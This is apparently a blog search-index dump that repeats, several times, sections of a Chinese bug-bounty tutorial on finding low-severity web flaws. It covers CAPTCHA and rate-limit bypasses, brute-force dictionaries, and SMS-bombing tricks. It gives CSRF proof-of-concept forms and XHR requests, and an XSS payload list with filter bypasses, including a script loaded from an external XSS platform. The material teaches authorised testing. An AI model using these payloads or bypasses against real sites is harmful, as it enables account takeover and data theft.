","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#github导致的信息泄露"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#配置错误导致的信息泄露"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#越权导致的信息泄露"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： \u003cimg src=http://www.xxxxx.com/csrf?xx=11 /\u003e (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: \u003chtml\u003e \u003cbody\u003e \u003cform name=\"px\" method=\"post\" action=\"http://www.xxxxx.com/add\"\u003e \u003cinput type=\"text\" name=\"user_id\" value=\"1111\"\u003e \u003c/form\u003e \u003cscript\u003edocument.px.submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： \u003cscript\u003e var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.xxxx.com/api/setrole\"); xhr.withCredentials = true; xhr.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); xhr.send('{\"role\":admin}'); \u003c/script\u003e 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e\u003ccross-domain-policy\u003e \u003callow-access-from domain=\"*\" /\u003e\u003c/cross-domain-policy\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: \u003cscript\u003ealert(1)\u003c/script\u003e \u003cscript src=https://xsspt.com/VBAhTu\u003e\u003c/script\u003e \u003ca href=javascript:alert(1)\u003exss\u003c/a\u003e \u003csvg onload=alert(1)\u003e \u003cimg src=1 onerror=alert(1)\u003e \u003cimg src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)\u003e \u003cdetails open ontoggle=alert(1)\u003e \u003cbody onload=alert(1)\u003e \u003cM onmouseover=alert(1)\u003eM \u003ciframe src=javascript:alert(1)\u003e\u003c/iframe\u003e \u003ciframe onload=alert(1)\u003e \u003cinput type=\"submit\" onfocus=alert(1)\u003e \u003cinput type=\"submit\" onclick=alert(1)\u003e \u003cform\u003e\u003cinput type=\"submit\" formaction=javascript:alert(1)\u003e bypass姿势 \u003c!-- 空格被过滤 --\u003e \u003cimg/src=\"1\"/onerror=alert(1)\u003e \u003c!-- 双写绕过 --\u003e \u003ciimgmg src=1 oonerrornerror=aimglert(1)\u003e \u003c!-- 大小写绕过 --\u003e \u003ciMg src=1 oNerRor=alert(1)\u003e \u003c!-- 利用eval() --\u003e \u003cimg src=1 onerror=\"a=`aler`;b=`t(1)`;eval(a+b);\"\u003e \u003cimg src=1 onerror=eval(atob('YWxlcnQoMSk='))\u003e \u003c!-- 利用location --\u003e \u003cimg src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'\u003e \u003cimg src=1 onerror=location='javascript:\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29'\u003e \u003cimg src=1 onerror=location=\"javascr\"+\"ipt:\"+\"%61%6C%65%72%74%28%31%29\"\u003e \u003c!-- 括号被过滤 --\u003e \u003cimg src=1 onerror=\"window.onerror=eval;throw'=alert\\x281\\x29';\"\u003e \u003c!-- onerror=被过滤 --\u003e \u003cimg src=1 onerror =alert(1)\u003e \u003cimg src=1 onerror =alert(1)\u003e \u003c!-- 属性被转换为大写 --\u003e \u003cimg src=1 onerror=alert(1)\u003e \u003c!-- 编码后被检测 --\u003e \u003cimg src=1 onerror=alert(1)\u003e 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#其他的owasptop10漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#csrf漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#3-flash-型"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#任意文件上传漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。 XSS漏洞老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章: https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html Broken5师傅的xsspayload: xss M bypass姿势 威胁情报的提交这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的 https://mp.weixin.qq.com","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:3","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#xss漏洞"},{"categories":["学习"],"content":" 其他的OWASPTop10漏洞 CSRF漏洞CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。 常见的漏洞点 1、修改个人资料、邮箱、密码、头像 2、发表文章 3、添加、删除评论 4、添加、修改、删除收货地址 5、添加管理员 (1) GET型 GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用： (2) POST型 POST请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。 poc(可以用burp自己生成的）: POST请求数据为json，当服务器没有严格校验content-type类型时，POC为： 3. Flash 型Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。 利用条件： 1、目标站点下必须存在crossdomain.xml文件。 2、crossdomain.xml中的配置允许其他域进行跨域请求。 \u003c?xml version=\"1.0\"?\u003e bypass小技巧 删除csrf token 置空csrf token 修改请求方法，如POST方法变GET请求 使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么 使用固定token token字段改成 token[]= 任意文件上传漏洞这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。 上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。 上传恶意文件进行钓鱼 尝试在上传的文件名前加../进行目录穿越。 可以结合其他漏洞比如CORS漏洞扩大危害。 